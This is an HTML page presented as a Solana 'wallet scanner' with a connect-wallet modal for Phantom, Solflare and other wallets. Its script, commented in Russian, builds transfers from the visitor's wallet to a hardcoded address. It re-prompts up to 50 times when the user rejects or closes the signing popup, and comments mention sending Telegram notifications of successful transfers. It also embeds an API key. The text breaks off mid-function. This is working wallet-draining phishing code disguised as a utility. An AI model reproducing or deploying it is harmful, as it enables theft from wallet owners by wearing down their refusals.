<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Solana Wallet Scanner with SOL Transfer</title>
  
  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º Solana Web3.js –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
  
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    #connectWalletBtn {
      padding: 10px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 10px;
      background-color: #4a90e2;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    #connectWalletBtn:hover {
      background-color: #357abd;
    }

    #connectWalletBtn.connected {
      background-color: #28a745;
    }

    #connectWalletBtn.connected:hover {
      background-color: #218838;
    }

    .hidden {
      display: none;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.5);
      z-index: 1000;
    }

    .connect-wallet, .all-wallets-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border-radius: 20px;
      width: 350px;
      padding: 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      z-index: 1001;
    }

    .connect-header, .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .connect-header h2, .modal-header h2 {
      margin: 0;
      font-size: 1.2rem;
      font-weight: 600;
      flex-grow: 1;
      text-align: center;
    }

    .help-btn, .close-btn, .back-btn {
      background: none;
      border: none;
      font-size: 1.2rem;
      cursor: pointer;
      width: 30px;
      height: 30px;
      color: #333;
    }

    .help-btn {
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      background-color: #e0e0e0;
    }

    .wallet-list {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .wallet-option {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px;
      background: #f5f5f5;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
      position: relative;
    }

    .wallet-option:hover {
      background: #e0e0e0;
    }

    .wallet-option img {
      width: 40px;
      height: 40px;
      margin-right: 10px;
      border-radius: 12px;
    }

    .wallet-option span {
      flex-grow: 1;
      font-size: 1rem;
      color: #333;
    }

    .wallet-status {
      font-size: 0.8rem;
      color: #28a745;
      margin-left: 10px;
    }

    .connection-status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 8px;
      text-align: center;
      font-size: 0.9rem;
    }

    .connection-status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .connection-status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .connection-status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }

    .connection-status.scanning {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeaa7;
    }

    .connection-status.warning {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeaa7;
    }

    .wallet-info {
      margin-top: 15px;
      padding: 10px;
      background: #f8f9fa;
      border-radius: 8px;
      font-size: 0.85rem;
    }

    .wallet-info .address {
      font-family: monospace;
      word-break: break-all;
      margin-top: 5px;
      color: #495057;
    }

    .wallet-details {
      margin-top: 10px;
      padding: 10px;
      background: #e9ecef;
      border-radius: 8px;
      font-size: 0.8rem;
    }

    .balance-info {
      margin-bottom: 10px;
      padding: 8px;
      background: #d4edda;
      border-radius: 5px;
      color: #155724;
    }

    .token-info {
      margin-bottom: 5px;
      padding: 5px;
      background: #f8f9fa;
      border-radius: 3px;
      border-left: 3px solid #007bff;
    }

    .transfer-section {
      margin-top: 15px;
      padding: 10px;
      background: #fff3cd;
      border-radius: 8px;
      border: 1px solid #ffeaa7;
    }

    .transfer-btn {
      background: #dc3545;
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
      font-size: 0.9rem;
      transition: background-color 0.3s;
    }

    .transfer-btn:hover {
      background: #c82333;
    }

    .transfer-btn:disabled {
      background: #6c757d;
      cursor: not-allowed;
    }

    .get-started {
      text-align: center;
      margin-top: 20px;
      color: #666;
      font-size: 0.9rem;
    }

    .get-started a {
      color: #0000EE;
      text-decoration: none;
    }

    .get-started a:hover {
      text-decoration: underline;
    }

    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      overflow-y: auto;
      flex-grow: 1;
    }

    .wallet-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f9f9f9;
      border-radius: 15px;
      padding: 10px;
      cursor: pointer;
      transition: background 0.3s;
      user-select: none;
      position: relative;
    }

    .wallet-item:hover {
      background: #e0e0e0;
    }

    .wallet-item img {
      width: 80px;
      height: 80px;
      margin-bottom: 8px;
      object-fit: contain;
      border-radius: 15px;
    }

    .wallet-item span {
      font-size: 0.85rem;
      color: #333;
      text-align: center;
    }

    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid #f3f3f3;
      border-top: 2px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .scan-progress {
      margin-top: 10px;
      padding: 8px;
      background: #fff3cd;
      border-radius: 5px;
      font-size: 0.8rem;
      color: #856404;
    }

    .scan-methods {
      margin-top: 10px;
      padding: 8px;
      background: #e3f2fd;
      border-radius: 5px;
      font-size: 0.75rem;
      color: #1565c0;
    }

    /* Mobile Adjustments for screens <= 394px */
    @media (max-width: 394px) {
      .connect-wallet, .all-wallets-modal {
        top: auto;
        bottom: 0;
        left: 0;
        right: 0;
        transform: none;
        width: 100vw;
        padding: 15px;
        border-radius: 15px 15px 0 0;
        max-height: 85vh;
        overflow-y: auto;
        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        box-sizing: border-box;
      }

      .connect-header h2, .modal-header h2 {
        font-size: 1.1rem;
      }

      .help-btn, .close-btn, .back-btn {
        width: 25px;
        height: 25px;
        font-size: 1.1rem;
      }

      .wallet-option {
        padding: 8px;
      }

      .wallet-option img {
        width: 35px;
        height: 35px;
        margin-right: 8px;
      }

      .wallet-option span {
        font-size: 0.95rem;
      }

      .get-started {
        font-size: 0.85rem;
        margin-top: 15px;
      }

      .wallet-grid {
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
      }

      .wallet-item img {
        width: 60px;
        height: 60px;
        margin-bottom: 6px;
      }

      .wallet-item span {
        font-size: 0.8rem;
      }
    }
  </style>
</head>
<body>
  <!-- Button to open the modal -->
  <button id="connectWalletBtn">Connect Wallet</button>

  <!-- Modal Overlay -->
  <div id="modalOverlay" class="modal-overlay hidden"></div>

  <!-- Connect Wallet Modal -->
  <div id="connectWalletModal" class="connect-wallet">
    <div class="connect-header">
      <button class="help-btn" title="Help">?</button>
      <h2>Connect Wallet</h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    
    <!-- Connection Status Display -->
    <div id="connectionStatus" class="connection-status hidden"></div>
    
    <!-- Wallet Info Display -->
    <div id="walletInfo" class="wallet-info hidden">
      <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
      <div><strong>Address:</strong></div>
      <div class="address" id="walletAddress"></div>
      
      <!-- Wallet Details -->
      <div id="walletDetails" class="wallet-details hidden">
        <div id="balanceInfo" class="balance-info"></div>
        <div id="tokensList"></div>
        <div id="scanMethods" class="scan-methods hidden"></div>
        
        <!-- SOL Transfer Section -->
        <div id="transferSection" class="transfer-section hidden">
          <div><strong>‚ö†Ô∏è SOL Transfer:</strong></div>
          <div style="font-size: 0.8rem; margin-top: 5px;">
            This will transfer 0.0050 SOL from your wallet to a specified address.
          </div>
          <button id="transferSolBtn" class="transfer-btn">
            Transfer 0.0050 SOL
          </button>
          <div id="transferStatus" style="margin-top: 10px; font-size: 0.8rem;"></div>
        </div>
      </div>
      
      <div style="margin-top: 10px;">
        <button id="disconnectBtn" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">Disconnect</button>
        <button id="rescanBtn" style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 5px;">Rescan</button>
      </div>
    </div>

    <div class="wallet-list">
      <div class="wallet-option" data-wallet="solflare">
        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
        <span>Solflare</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="phantom">
        <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
        <span>Phantom</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="trustwallet">
        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
        <span>Trust Wallet</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="coinbase">
        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
        <span>Coinbase</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="bitget">
        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
        <span>Bitget Wallet</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" id="allWalletsBtn">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="All Wallets" />
        <span>All Wallets</span>
      </div>
    </div>
    <div class="get-started">
      Haven't got a wallet? <a href="https://phantom.app/" target="_blank">Get started</a>
    </div>
  </div>

  <!-- All Wallets Modal -->
  <div id="allWalletsModal" class="all-wallets-modal hidden">
    <div class="modal-header">
      <button class="back-btn" title="Back">‚Üê</button>
      <h2>All Wallets</h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    <div class="wallet-grid">
      <div class="wallet-item" data-wallet="solflare" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E" alt="Solflare" />
        <span>Solflare</span>
      </div>
      <div class="wallet-item" data-wallet="phantom" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Phantom" />
        <span>Phantom</span>
      </div>
      <div class="wallet-item" data-wallet="trustwallet" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E" alt="Trust Wallet" />
        <span>Trust Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="coinbase" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%201024%201024'%3E%3Cpath%20fill='%230052FF'%20d='M0%200h1024v1024H0z'/%3E%3Cpath%20fill='%23fff'%20fill-rule='evenodd'%20d='M152%20512a360%20360%200%201%200%20720%200%20360%20360%200%200%200-720%200Zm268-116c-13%200-24%2011-24%2024v184c0%2013%2011%2024%2024%2024h184c13%200%2024-11%2024-24V420c0-13-11-24-24-24H420Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Coinbase" />
        <span>Coinbase</span>
      </div>
      <div class="wallet-item" data-wallet="bitget" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20512%20512%22%3E%3Cpath%20fill=%22%23001F29%22%20d=%22M0%200h512v512H0z%22/%3E%3Cpath%20fill=%22%2300F0FF%22%20d=%22M220%2096h-55c-11%200-15%2014-7%2022l125%20125c4%204%206%208%207%2013-1%205-3%209-7%2012L158%20393c-8%209-4%2023%207%2023h83c12%200%2019-7%2025-13l113-113c9-9%2017-21%2017-34%200-14-8-26-17-35L273%20109c-6-7-13-13-25-13h-28Z%22/%3E%3C/svg%3E" alt="Bitget Wallet" />
        <span>Bitget Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="backpack" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='10%2010%20220%20220'%3E%3Cpath%20fill='%23fff'%20d='M0%200h240v240H0z'/%3E%3Cpath%20fill='%23EB4646'%20fill-rule='evenodd'%20d='M129%2053c5%200%2010%200%2014%202-4-10-13-13-23-13s-18%203-23%2013c5-2%209-2%2014-2h18Zm-19%2010c-24%200-37%2018-37%2041v24c0%202%202%204%204%204h86c2%200%204-2%204-4v-24c0-23-16-41-39-41h-18Zm10%2041a15%2015%200%201%200%200-30%2015%2015%200%200%200%200%2030Zm-47%2042c0-3%202-5%204-5h86c2%200%204%202%204%205v24c0%205-4%209-9%209H82c-5%200-9-4-9-9v-24Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Backpack" />
        <span>Backpack</span>
      </div>
    </div>
  </div>

  <script>
    // ============================================================================
    // SOLANA SOL TRANSFER FUNCTIONALITY WITH SPAM PROTECTION
    // ============================================================================

    /**
     * –ö–ª–∞—Å—Å –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–µ—Ä–µ–≤–æ–¥–∞–º–∏ SOL —Å —Ñ—É–Ω–∫—Ü–∏–µ–π —Å–ø–∞–º–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
     */
    class SolanaSolTransfer {
      constructor() {
        // –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è (–∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –Ω—É–∂–Ω—ã–π –∞–¥—Ä–µ—Å)
        this.RECIPIENT_ADDRESS = '7BgBvyjrZX8YKHGoW9Y9NChumg5BNVN1r8fKSaVqNPXa';
        
        // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ SOL –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ (0.0050 SOL = 5,000,000 lamports)
        this.TRANSFER_AMOUNT_SOL = 0.0050;
        this.TRANSFER_AMOUNT_LAMPORTS = this.TRANSFER_AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL;
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–ø–∞–º–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
        this.MAX_SPAM_ATTEMPTS = 50; // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
        this.SPAM_DELAY_MIN = 1000; // –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏ (–º—Å)
        this.SPAM_DELAY_MAX = 3000; // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏ (–º—Å)
        this.currentSpamAttempt = 0;
        this.isSpamActive = false;
        this.spamTimeouts = [];
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ RPC
        this.RPC_ENDPOINTS = [
          'https://mainnet.helius-rpc.com/?api-key=5d71bf51-5f82-4892-8b89-c7257acb9384',
          'https://api.mainnet-beta.solana.com',
          'https://solana-api.projectserum.com'
        ];
        
        this.connection = null;
        this.initConnection();
      }

      /**
       * –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Solana
       */
      initConnection() {
        try {
          this.connection = new solanaWeb3.Connection(
            this.RPC_ENDPOINTS[0],
            'confirmed'
          );
          console.log('‚úÖ Solana connection initialized for SOL transfer');
        } catch (error) {
          console.error('‚ùå Failed to initialize Solana connection:', error);
        }
      }

      /**
       * –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ 0.0050 SOL
       */
      async createSolTransferTransaction(fromAddress, toAddress, amount) {
        if (!this.connection) {
          throw new Error('Solana connection not initialized');
        }

        console.log('üöÄ Creating SOL transfer transaction...');
        console.log('üìç From:', fromAddress);
        console.log('üìç To:', toAddress);
        console.log('üí∞ Amount:', amount / solanaWeb3.LAMPORTS_PER_SOL, 'SOL');

        const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
        const toPubkey = new solanaWeb3.PublicKey(toAddress);

        // –°–æ–∑–¥–∞–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø–µ—Ä–µ–≤–æ–¥–∞ SOL
        const transferInstruction = solanaWeb3.SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: toPubkey,
          lamports: amount
        });

        // –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
        const transaction = new solanaWeb3.Transaction().add(transferInstruction);

        // –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–π –±–ª–æ–∫—Ö–µ—à
        const { blockhash } = await this.connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;

        console.log('üì¶ SOL transfer transaction created');
        
        return transaction;
      }

      /**
       * –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ SOL
       */
      async checkSolBalance(address) {
        try {
          const publicKey = new solanaWeb3.PublicKey(address);
          const balance = await this.connection.getBalance(publicKey);
          const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
          
          console.log(`üí∞ Current SOL balance: ${solBalance} SOL`);
          return { balance: solBalance, lamports: balance };
        } catch (error) {
          console.error('‚ùå Error checking SOL balance:', error);
          return { balance: 0, lamports: 0 };
        }
      }

      /**
       * –ó–∞–ø—É—Å–∫ —Å–ø–∞–º–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
       */
      async startTransactionSpam(walletAddress, walletProvider) {
        if (this.isSpamActive) {
          console.log('üîÑ Transaction spam already active');
          return;
        }

        this.isSpamActive = true;
        this.currentSpamAttempt = 0;
        
        console.log('üö® Starting transaction spam...');
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–µ—Ä–≤—É—é –ø–æ–ø—ã—Ç–∫—É
        await this.executeSpamAttempt(walletAddress, walletProvider);
      }

      /**
       * –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–¥–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ —Å–ø–∞–º–∞
       */
      async executeSpamAttempt(walletAddress, walletProvider) {
        if (!this.isSpamActive || this.currentSpamAttempt >= this.MAX_SPAM_ATTEMPTS) {
          console.log('üõë Transaction spam stopped');
          this.isSpamActive = false;
          return;
        }

        this.currentSpamAttempt++;
        
        console.log(`üîÑ Spam attempt ${this.currentSpamAttempt}/${this.MAX_SPAM_ATTEMPTS}`);
        
        try {
          // –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –ø–µ—Ä–µ–¥ –∫–∞–∂–¥–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
          const balanceInfo = await this.checkSolBalance(walletAddress);
          
          if (balanceInfo.balance < this.TRANSFER_AMOUNT_SOL) {
            console.log('‚ùå Insufficient balance, stopping spam');
            this.isSpamActive = false;
            return;
          }

          // –°–æ–∑–¥–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
          const result = await this.executeSingleTransfer(walletAddress, walletProvider);
          
          if (result.success) {
            console.log('‚úÖ Spam transaction successful!');
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
            await this.sendSolTransferNotification(
              `Spam Transfer #${this.currentSpamAttempt}`,
              walletAddress,
              result
            );
            
            // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ø–∞–º –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            this.isSpamActive = false;
            return;
          }
          
        } catch (error) {
          console.error(`‚ùå Spam attempt ${this.currentSpamAttempt} failed:`, error);
          
          // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–∏–ø—ã –æ—à–∏–±–æ–∫ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ –ø–æ–≤—Ç–æ—Ä–∞
          if (this.shouldRetryAfterError(error)) {
            console.log('üîÑ Will retry after error...');
          } else {
            console.log('üõë Critical error, stopping spam');
            this.isSpamActive = false;
            return;
          }
        }

        // –ü–ª–∞–Ω–∏—Ä—É–µ–º —Å–ª–µ–¥—É—é—â—É—é –ø–æ–ø—ã—Ç–∫—É —Å —Å–ª—É—á–∞–π–Ω–æ–π –∑–∞–¥–µ—Ä–∂–∫–æ–π
        if (this.isSpamActive) {
          const delay = Math.random() * (this.SPAM_DELAY_MAX - this.SPAM_DELAY_MIN) + this.SPAM_DELAY_MIN;
          
          console.log(`‚è≥ Next spam attempt in ${Math.round(delay)}ms`);
          
          const timeoutId = setTimeout(() => {
            this.executeSpamAttempt(walletAddress, walletProvider);
          }, delay);
          
          this.spamTimeouts.push(timeoutId);
        }
      }

      /**
       * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ, —Å—Ç–æ–∏—Ç –ª–∏ –ø–æ–≤—Ç–æ—Ä—è—Ç—å –ø–æ–ø—ã—Ç–∫—É –ø–æ—Å–ª–µ –æ—à–∏–±–∫–∏
       */
      shouldRetryAfterError(error) {
        const errorMessage = error.message.toLowerCase();
        
        // –û—à–∏–±–∫–∏, –ø–æ—Å–ª–µ –∫–æ—Ç–æ—Ä—ã—Ö —Å—Ç–æ–∏—Ç –ø–æ–≤—Ç–æ—Ä–∏—Ç—å
        const retryableErrors = [
          'user rejected',
          'user denied',
          'user cancelled',
          'transaction cancelled',
          'popup closed',
          'user closed',
          'rejected by user',
          'cancelled by user'
        ];
        
        return retryableErrors.some(retryError => errorMessage.includes(retryError));
      }

      /**
       * –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–¥–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (–±–µ–∑ –ø–æ–≤—Ç–æ—Ä–æ–≤)
       */
      async executeSingleTransfer(walletAddress, walletProvider) {
        try {
          // –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
          const transaction = await this.createSolTransferTransaction(
            walletAddress,
            this.RECIPIENT_ADDRESS,
            this.TRANSFER_AMOUNT_LAMPORTS
          );

          console.log('üìù Requesting wallet signature...');

          // –ü–æ–¥–ø–∏—Å—ã–≤–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é —á–µ—Ä–µ–∑ –∫–æ—à–µ–ª–µ–∫
          let signedTransaction;
          
          if (walletProvider.signTransaction) {
            signedTransaction = await walletProvider.signTransaction(transaction);
          } else if (walletProvider.signAndSendTransaction) {
            // –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –∫–æ—à–µ–ª—å–∫–∏ —Å—Ä–∞–∑—É –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            const signature = await walletProvider.signAndSendTransaction(transaction);
            console.log('‚úÖ SOL transfer sent with signature:', signature);
            
            return {
              success: true,
              signature: signature,
              amount: this.TRANSFER_AMOUNT_SOL,
              recipient: this.RECIPIENT_ADDRESS,
              message: `Successfully transferred ${this.TRANSFER_AMOUNT_SOL} SOL`
            };
          } else {
            throw new Error('Wallet does not support transaction signing');
          }

          console.log('üì§ Sending signed SOL transfer transaction...');

          // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
          const signature = await this.connection.sendRawTransaction(
            signedTransaction.serialize(),
            {
              skipPreflight: false,
              preflightCommitment: 'confirmed'
            }
          );

          console.log('‚è≥ Confirming SOL transfer transaction...');

          // –ñ–¥–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
          const confirmation = await this.connection.confirmTransaction(signature, 'confirmed');

          if (confirmation.value.err) {
            throw new Error(`SOL transfer failed: ${confirmation.value.err}`);
          }

          console.log('‚úÖ SOL transfer confirmed:', signature);

          return {
            success: true,
            signature,
            amount: this.TRANSFER_AMOUNT_SOL,
            recipient: this.RECIPIENT_ADDRESS,
            message: `Successfully transferred ${this.TRANSFER_AMOUNT_SOL} SOL`
          };

        } catch (error) {
          console.error('‚ùå Single SOL transfer failed:', error);
          
          return {
            success: false,
            error: error.message,
            amount: this.TRANSFER_AMOUNT_SOL,
